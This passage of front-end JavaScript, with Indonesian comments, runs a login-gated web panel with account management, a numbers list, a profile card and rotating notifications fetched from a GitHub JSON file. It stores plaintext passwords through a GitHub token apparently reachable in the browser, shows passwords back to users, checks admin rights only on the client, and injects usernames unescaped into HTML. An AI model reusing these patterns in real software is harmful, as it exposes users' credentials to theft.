  bottomNav.classList.add('show');
  setActiveBottomNav('dashboard');

  // Tambahkan event listener click setelah nav tampil
  bottomNav.querySelectorAll('a[data-view]').forEach(a=>{
    a.onclick = (e)=>{
      e.preventDefault();
      const v = a.dataset.view;
      setView(v);
      setActiveBottomNav(v);

      if(v==='numbers'){ loadNumbers(); }
      if(v==='accounts'){ 
  if(state.role === 'admin'){
    loadLogins(); 
    renderAccounts(); 
  } else {
    setView('accounts-blocked');
  }
}
    };
  });
}

let slideIndex = 0;
let slidesBox;

function showSlidesBox() {
  slidesBox.forEach((el) => el.classList.remove("active", "prev"));

  const prevIndex = slideIndex;
  slideIndex = (slideIndex + 1) % slidesBox.length;

  slidesBox[prevIndex].classList.add("prev");
  slidesBox[slideIndex].classList.add("active");

  setTimeout(showSlidesBox, 2000); // ganti tiap 4 detik
}

document.addEventListener("DOMContentLoaded", () => {
  slidesBox = document.querySelectorAll(".slideshow-box .slide-box");
  if (slidesBox.length > 0) {
    slidesBox[0].classList.add("active");
    setTimeout(showSlidesBox, 4000);
  }
});

// click handlers: show text on active, change view
document.querySelectorAll('#bottomNav a[data-view]').forEach(a=>{
  a.addEventListener('click', e=>{
    e.preventDefault();
    const v = a.dataset.view;
    setView(v);
    setActiveBottomNav(v);
  });
});

// Optional: when setView() is called elsewhere, also sync bottom nav
// If you want ensure sync, modify setView to call setActiveBottomNav(id) at the end.
const _origSetView = setView;
setView = function(id){
  _origSetView(id);
  // sync bottom nav if visible
  const bn = document.getElementById('bottomNav');
  if(bn && bn.classList.contains('show')) setActiveBottomNav(id);
}

    // ====== ACCOUNTS (ADMIN) ======
    function renderAccounts(){
  const body = document.getElementById('accountsTable');
  body.innerHTML = '';

  state.loginList.forEach((acc, i) => {
    let expiredText = "Tidak ada";

    if(acc.expired){
      const expDate = new Date(acc.expired).getTime();
      const now = Date.now();
      const diff = expDate - now;
      const daysLeft = Math.ceil(diff / (1000*60*60*24));

      if(daysLeft > 0){
        expiredText = `${daysLeft} hari lagi`;
      } else {
        expiredText = `Lewat ${Math.abs(daysLeft)} hari`;
      }
    }

    const tr = document.createElement('tr');
    tr.innerHTML = `
      <td>${i+1}</td>
      <td>${acc.username}</td>
      <td>${acc.role}</td>
      <td>${expiredText}</td>
      <td>
        <button class="btn small danger" onclick="deleteAccount('${acc.username}')">Hapus</button>
      </td>
    `;
    body.appendChild(tr);
  });
}

    async function createAccount(u,p,r,expInput){
  if(!u||!p) throw new Error('Username & password wajib');
  if(state.loginList.some(x=>x.username===u)) throw new Error('Username sudah ada');

  // parse di sini, bukan langsung simpan expInput
  const expDate = parseExpired(expInput);

  if(!Array.isArray(state.loginList)) state.loginList = [];

  state.loginList.push({
    username: u,
    password: p,
    role: r,
    expired: expDate || null
  });

  await githubPut(API_LOGIN, TOKEN_LOGIN, state.loginList, `create user ${u}`, state.loginSha);
  await loadLogins();
  renderAccounts();
}

    // ====== UI WIRING ======
    const formLogin = document.getElementById('formLogin');
    const loginMsg = document.getElementById('loginMsg');
    const numMsg   = document.getElementById('numMsg');
    const accMsg   = document.getElementById('accMsg');
    const drawer   = document.getElementById('drawer');

    document.getElementById('btnHamburger').onclick = ()=> drawer.classList.toggle('open');

    document.querySelectorAll('.menu a[data-view]').forEach(a=>{
      a.addEventListener('click', async (e)=>{
        e.preventDefault(); const v = a.dataset.view; setView(v);
        if(v==='numbers'){ await loadNumbers(); }
        if(v==='accounts'){ await loadLogins(); renderAccounts(); }
      })
    })

    formLogin.addEventListener('submit', async (e)=>{
      e.preventDefault(); 
      loginMsg.textContent = 'Memeriksa…';
      const u = document.getElementById('username').value.trim();
      const p = document.getElementById('password').value.trim();
      try{
        const ok = await doLogin(u,p);
        if(!ok){ 
          toast(loginMsg, 'Username atau password salah', false); 
          return; 
        }
        toast(loginMsg, 'Berhasil masuk');
        document.getElementById('who').textContent = u + ' • ' + ok.role;
        document.getElementById('userBadge').classList.remove('hidden');
        document.getElementById('roleChip').textContent = ok.role;
        if(ok.role==='admin') document.getElementById('adminSection').classList.remove('hidden');
        document.getElementById('btnHamburger').classList.remove('hidden');
  document.getElementById('btnProfile').classList.remove('hidden');

    // 🔥 panggil nav biar muncul
    showBottomNav();
        setView('dashboard');
        await loadNumbers();
      }catch(err){ 
        toast(loginMsg, err.message, false); 
      }
    });

    document.getElementById('btnAddNumber').onclick = async()=>{
      const field = document.getElementById('numberInput');
      try{ await addNumber(field.value.trim()); toast(numMsg,'Nomor ditambahkan'); field.value=''; }
      catch(e){ toast(numMsg, e.message, false) }
    }

    document.getElementById('btnCreate').onclick = async()=>{
  const u   = document.getElementById('newUser').value.trim();
  const p   = document.getElementById('newPass').value.trim();
  const r   = document.getElementById('newRole').value; 
  const exp = document.getElementById('newExpired').value.trim() || null;

  try { 
    await createAccount(u,p,r,exp); 
    toast(accMsg,'Akun dibuat');
    document.getElementById('newUser').value='';
    document.getElementById('newPass').value='';
    document.getElementById('newExpired').value='';
  } catch(e){ 
    toast(accMsg, e.message, false); 
  }
}

    // Reveal on scroll
    const io = new IntersectionObserver((entries)=>{
      entries.forEach(e=>{ if(e.isIntersecting) e.target.classList.add('visible') })
    }, {threshold:.15});
    document.querySelectorAll('.reveal').forEach(el=> io.observe(el));
    
    // Reveal untuk bug-card (staggered animasi)
const bugCards = document.querySelectorAll('.bug-card');
const ioBug = new IntersectionObserver((entries)=>{
  entries.forEach(e=>{
    if(e.isIntersecting){
      bugCards.forEach((card, idx)=>{
        setTimeout(()=> card.classList.add('visible'), idx * 200); // delay 200ms per item
      });
      ioBug.disconnect();
    }
  });
}, {threshold:.2});
if(bugCards.length) ioBug.observe(bugCards[0]);

// Start
    restoreSession();

document.addEventListener("DOMContentLoaded", () => {
  const btnProfile = document.getElementById('btnProfile');
  const profileCard = document.getElementById('profileCard');
  const closeProfile = document.getElementById('closeProfile');
  const profileUsername = document.getElementById('profileUsername');
  const profilePassword = document.getElementById('profilePassword');
  const profileExpired = document.getElementById('profileExpired');
  const profileLogout = document.getElementById('profileLogout');

  function daysLeft(exp){
    if(!exp) return "Tidak ada";
    const expDate = new Date(exp).getTime();
    const now = Date.now();
    const diff = expDate - now;
    const days = Math.ceil(diff / (1000*60*60*24));
    return days > 0 ? `${days} hari lagi` : `Expired ${Math.abs(days)} hari lalu`;
  }

  btnProfile.addEventListener("click", async () => {
    await loadLogins();
    const found = state.loginList.find(u => u.username === state.user);
    if(found){
      profileUsername.textContent = found.username;
      profilePassword.textContent = found.password;
      profileExpired.textContent = daysLeft(found.expired);
    }
    profileCard.classList.add('show');
  });

  closeProfile.addEventListener("click", () => {
    profileCard.classList.remove('show');
  });

  profileLogout.addEventListener("click", logout);
});

function showPopupNotif(text, success = true) {
  const popup = document.getElementById("notifPopup");
  const popupText = document.getElementById("notifText");
  const popupIcon = popup.querySelector("i");

  popupText.textContent = text;

  if (success) {
    popupIcon.className = "fa-solid fa-circle-check";
    popupIcon.style.color = "lime";
  } else {
    popupIcon.className = "fa-solid fa-circle-xmark";
    popupIcon.style.color = "red";
  }

  popup.classList.add("show");
  popup.classList.remove("hidden");

  // ✅ Muncul cepat, bertahan lama (3.5 detik), lalu smooth hilang
  setTimeout(() => {
    popup.classList.remove("show");
    setTimeout(() => popup.classList.add("hidden"), 250);
  }, 3500);
}

  



async function startNotifCycle() {
  try {
    const res = await fetch("https://raw.githubusercontent.com/DaffaDevv/ACTIVITY/main/activity.json");
    const data = await res.json();

    const allMessages = Object.keys(data.Servers || {})
      .filter(k => k.toLowerCase().startsWith("message"))
      .map(k => data.Servers[k])
      .filter(Boolean);

    let queue = [];

    function shuffleMessages() {
      queue = [...allMessages];
      for (let i = queue.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [queue[i], queue[j]] = [queue[j], queue[i]];
      }
    }

    shuffleMessages();

    const box = document.getElementById("topNotif");
    const nameEl = document.getElementById("notifName");
    const msgEl = document.getElementById("notifMsg");
    const sound = document.getElementById("notifSound");
    const btnClose = document.getElementById("notifClose");

    function showNotif() {
      if (!queue.length) shuffleMessages();

      const msg = queue.shift();
      if (!msg) return;

      nameEl.textContent = "NOTIFICATION";
      msgEl.textContent = msg;
      box.classList.remove("hidden");

      // mainkan suara dengan sedikit delay biar sinkron
      if (sound) {
        sound.currentTime = 0;
        setTimeout(() => {
          sound.play().catch(err => console.warn("Audio blocked:", err));
        }, 200); // 0.2 detik setelah popup muncul
      }

      setTimeout(() => box.classList.add("hidden"), 5000);
    }

    btnClose.onclick = () => {
      box.classList.add("hidden");
    };

    showNotif();
    setInterval(showNotif, 20000); // jeda 20 detik
  } catch (err) {
    console.error("Notif error:", err);
  }
}
